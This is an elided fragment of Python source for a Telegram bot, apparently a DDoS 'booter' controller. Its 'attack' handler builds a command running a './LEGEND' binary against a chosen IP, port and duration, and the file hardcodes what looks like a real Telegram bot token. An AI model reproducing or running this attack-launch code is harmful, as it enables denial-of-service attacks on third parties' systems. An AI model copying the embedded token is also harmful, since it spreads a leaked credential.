...
# Bot Configuration
TELEGRAM_BOT_TOKEN = '7757010456:AAG17mWIWVI757SyKc9gBOBM3ZBXV9NuKPQ'
...
print(f"The current user is: {USER_NAME}") # Get the current system user
...
async def attack(update: Update, context: CallbackContext):
    ...
    if argument_type == 3:
        attack_command = f"./LEGEND {ip} {port} {duration} 900"
